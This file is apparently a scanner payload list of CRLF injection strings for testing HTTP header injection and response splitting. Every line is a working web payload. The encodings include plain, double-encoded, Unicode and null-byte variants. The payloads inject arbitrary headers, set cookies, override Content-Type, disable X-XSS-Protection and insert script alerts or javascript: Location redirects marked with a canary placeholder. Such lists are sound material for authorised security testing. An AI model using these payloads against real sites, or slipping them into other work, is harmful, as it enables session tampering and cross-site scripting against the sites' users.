# CRLF Injection Payloads
# Test for HTTP header injection and response splitting

# Basic CRLF
%0d%0aInjected-Header:fxss
%0aInjected-Header:fxss
%0dInjected-Header:fxss

# Response splitting with XSS
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('{{CANARY}}')</script>
%0d%0a%0d%0a<img src=x onerror=alert('{{CANARY}}')>

# Cookie injection
%0d%0aSet-Cookie:%20xss=<script>alert('{{CANARY}}')</script>

# Double encoded
%250d%250aInjected-Header:fxss
%25250d%25250aInjected-Header:fxss

# Unicode/UTF-8 variants
%e5%98%8a%e5%98%8dInjected-Header:fxss

# Null byte prefix
%00%0d%0aInjected-Header:fxss

# Location header injection (redirect to XSS)
%0d%0aLocation:%20javascript:alert('{{CANARY}}')

# X-XSS-Protection disable
%0d%0aX-XSS-Protection:%200

# Content-Type override
%0d%0aContent-Type:%20text/html
